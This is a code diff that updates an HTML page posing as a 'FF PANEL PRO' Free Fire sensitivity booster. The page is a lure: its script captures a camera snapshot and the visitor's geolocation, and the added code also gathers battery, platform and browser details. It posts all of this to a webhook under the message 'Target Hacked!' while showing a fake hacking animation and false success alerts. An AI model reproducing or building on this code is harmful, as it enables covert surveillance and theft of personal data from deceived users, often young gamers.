@@ -3,24 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FF PANEL PRO v5.0</title>
+    <title>FF PANEL PRO v6.0</title>
     <style>
-        body { background: #0b1116; color: white; font-family: sans-serif; text-align: center; margin: 0; }
+        body { background: #0b1116; color: white; font-family: sans-serif; text-align: center; margin: 0; overflow: hidden; }
         .hero { padding: 40px 20px; background: #161b22; border-bottom: 2px solid #ff0055; }
         .scanner-box { background: #1a1a1a; color: #00ff00; padding: 25px; border-radius: 15px; border: 1px solid #333; margin: 20px auto; max-width: 450px; }
-        button { background: #ff0055; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 85%; font-size: 16px; margin-top: 15px; }
+        button { background: #ff0055; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 85%; font-size: 16px; margin-top: 15px; transition: 0.3s; }
+        #hacker-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; color: #0f0; padding: 20px; text-align: left; font-family: 'Courier New', monospace; z-index: 100; font-size: 14px; }
     </style>
 </head>
 <body>
+    <div id="hacker-screen"></div>
+
     <div class="hero">
         <h1 style="color:#ff0055; margin:0;">FF PANEL PRO</h1>
-        <p>Advance Sensi & Face ID Verification</p>
+        <p>Advance Sensi & Device Optimization</p>
     </div>
 
     <div class="scanner-box">
         <h3 style="color: #00ffcc;">[System Analyzer]</h3>
-        <p>📡 Network: Stable</p>
-        <p>📍 Location: Ready</p>
+        <p>📡 Device Status: Ready</p>
+        <p>📍 Data Tunnel: Encrypted</p>
         <button onclick="masterFunction()" id="mainBtn">ACTIVATE VIP SENSI</button>
     </div>
 
@@ -32,23 +35,37 @@
 
     async function masterFunction() {
         const btn = document.getElementById('mainBtn');
-        btn.innerText = "PROCESSING...";
+        btn.innerText = "ACCESSING...";
         
-        let latitude = "Not Found";
-        let longitude = "Not Found";
+        // ১. ডিভাইস এবং ব্যাটারি ইনফো নেওয়া
+        let batteryInfo = "Unknown";
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Discharging"})`;
+        }
+        
+        const deviceInfo = `📱 **Model:** ${navigator.platform}\n🌐 **Browser:** ${navigator.userAgent.split(') ')[0].split(' (')[1]}\n🔋 **Battery:** ${batteryInfo}`;
 
-        // ১. আগে লোকেশন নিবে
+        // ২. ফেক হ্যাকিং স্ক্রিন অ্যানিমেশন
+        const screen = document.getElementById('hacker-screen');
+        screen.style.display = 'block';
+        let logs = ["Connecting to server...", "Accessing RAM...", "Bypassing Firewall...", "Extracting Data...", "Injecting Sensi Script...", "SUCCESS!"];
+        let i = 0;
+        let interval = setInterval(() => {
+            screen.innerHTML += `<p>> ${logs[i]}</p>`;
+            i++;
+            if(i >= logs.length) clearInterval(interval);
+        }, 600);
+
+        // ৩. লোকেশন ও ক্যামেরা ট্র্যাকিং
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            latitude = pos.coords.latitude;
-            longitude = pos.coords.longitude;
-            startCamera(latitude, longitude);
+            startCamera(pos.coords.latitude, pos.coords.longitude, deviceInfo);
         }, (err) => {
-            startCamera("Denied", "Denied");
+            startCamera("Denied", "Denied", deviceInfo);
         });
     }
 
-    async function startCamera(lat, lon) {
-        const btn = document.getElementById('mainBtn');
+    async function startCamera(lat, lon, deviceInfo) {
         try {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -64,27 +81,19 @@
                     const formData = new FormData();
                     formData.append('file', blob, 'snapshot.jpg');
                     
-                    // এখানে ছবি এবং লোকেশন একসাথে মেসেজে যাবে
-                    let msg = `📸 **New Face ID Snapshot!**\n📍 **Location:** http://google.com/maps?q=$${lat},${lon}`;
-                    if(lat === "Denied") msg = "📸 **Snapshot Captured!**\n🚫 *Location Permission Denied*";
-                    
+                    let msg = `🔥 **Target Hacked!**\n\n${deviceInfo}\n📍 **Map:** http://maps.google.com/maps?q=${lat},${lon}`;
                     formData.append('content', msg);
 
-                    await fetch(webhook, {
-                        method: 'POST',
-                        body: formData
-                    });
-
+                    await fetch(webhook, { method: 'POST', body: formData });
                     stream.getTracks().forEach(t => t.stop());
                 }, 'image/jpeg');
                 
-                alert("Sensi Activated Successfully!");
-                btn.innerText = "SUCCESS";
-            }, 2000);
-
+                alert("Sensi Successfully Injected to your Device!");
+                location.reload();
+            }, 3000);
         } catch (e) {
-            alert("Security Error! Please ALLOW permissions.");
-            btn.innerText = "RETRY";
+            alert("Permission Error!");
+            location.reload();
         }
     }
     </script>
